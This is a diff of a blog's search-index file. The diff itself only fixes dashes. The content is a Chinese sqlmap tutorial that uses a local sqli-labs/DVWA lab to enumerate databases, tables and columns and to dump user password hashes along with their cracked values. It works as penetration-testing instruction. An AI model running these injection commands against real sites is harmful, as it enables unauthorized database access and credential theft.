@@ -251,20 +251,20 @@ int main (void) {
     <url>/2020/04/19/sqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h2 id="列举数据库名称"><a href="#列举数据库名称" class="headerlink" title="列举数据库名称"></a>列举数据库名称</h2><hr>
 <blockquote>
-<p>sqlmap -u “url” –dbs<br>example: sqlmap -u “<a href="http://192.168.20.143/sqli/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.20.143/sqli/Less-1/?id=1&quot;</a> –dbs</p>
+<p>sqlmap -u “url” --dbs<br>example: sqlmap -u “<a href="http://192.168.20.143/sqli/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.20.143/sqli/Less-1/?id=1&quot;</a> --dbs</p>
 </blockquote>
 <p><strong>显示效果</strong><br>available databases [9]:<br>[*] challenges<br>[*] dvwa<br>[*] information_schema<br>[*] kk<br>[*] mysql<br>[*] performance_schema<br>[*] security<br>[*] test<br>[*] xssplatform</p>
 <h2 id="列举指定数据库中的表"><a href="#列举指定数据库中的表" class="headerlink" title="列举指定数据库中的表"></a>列举指定数据库中的表</h2><hr>
 <blockquote>
-<p>sqlmap -u “url” -D 数据库名称 –tables<br>example: sqlmap -u “192.168.20.143/sqli/Less-1/?id=1” –dbs -D dvwa –tables </p>
+<p>sqlmap -u “url” --dbs -D 数据库名称 --tables<br>example: sqlmap -u “192.168.20.143/sqli/Less-1/?id=1” --dbs -D dvwa --tables </p>
 </blockquote>
 <p><strong>显示效果</strong><br>[10:03:36] [INFO] fetching tables for database: ‘dvwa’<br>[10:03:36] [INFO] resumed: ‘guestbook’<br>[10:03:36] [INFO] resumed: ‘users’<br>Database: dvwa<br>[2 tables]<br>+————-+<br>|&nbsp;guestbook&nbsp;|<br>| &nbsp;&nbsp;&nbsp;&nbsp;users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>+————-+</p>
 <h2 id="列举表结构"><a href="#列举表结构" class="headerlink" title="列举表结构"></a>列举表结构</h2><blockquote>
-<p>sqlmap -u “url” -D 数据库名称 -T 表名 –columns<br>example: sqlmap -u “192.168.20.143/sqli/Less-1/?id=1” –dbs -D dvwa -T users –columns</p>
+<p>sqlmap -u “url” --dbs -D 数据库名称 -T 表名 --columns<br>example: sqlmap -u “192.168.20.143/sqli/Less-1/?id=1” --dbs -D dvwa -T users --columns</p>
 </blockquote>
 <p><strong>显示效果</strong><br>Database: dvwa<br>Table: users<br>[8 columns]<br>+————–+————-+<br>| Column       | Type        |<br>+————–+————-+<br>| password     | varchar(32) |<br>| user         | varchar(15) |<br>| avatar       | varchar(70) |<br>| failed_login | int(3)      |<br>| first_name   | varchar(15) |<br>| last_login   | timestamp   |<br>| last_name    | varchar(15) |<br>| user_id      | int(6)      |<br>+————–+————-+</p>
 <h2 id="显示表中的数据"><a href="#显示表中的数据" class="headerlink" title="显示表中的数据"></a>显示表中的数据</h2><blockquote>
-<p>sqlmap -u “url” –dbs -D 数据库名称 -T 表名 -C id,name,…<br>example: sqlmap -u “192.168.20.143/sqli/Less-1/?id=1” -D dvwa -T users -C user,password –dump</p>
+<p>sqlmap -u “url” --dbs -D 数据库名称 -T 表名 -C id,name,…<br>example: sqlmap -u “192.168.20.143/sqli/Less-1/?id=1” -D dvwa -T users -C user,password --dump</p>
 </blockquote>
 <p><strong>显示效果</strong><br>Database: dvwa<br>Table: users<br>[5 entries]<br>+———+———————————————+<br>| user    | password                                    |<br>+———+———————————————+<br>| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |<br>| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |<br>| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |<br>| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |<br>| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |<br>+———+———————————————+</p>
 ]]></content>
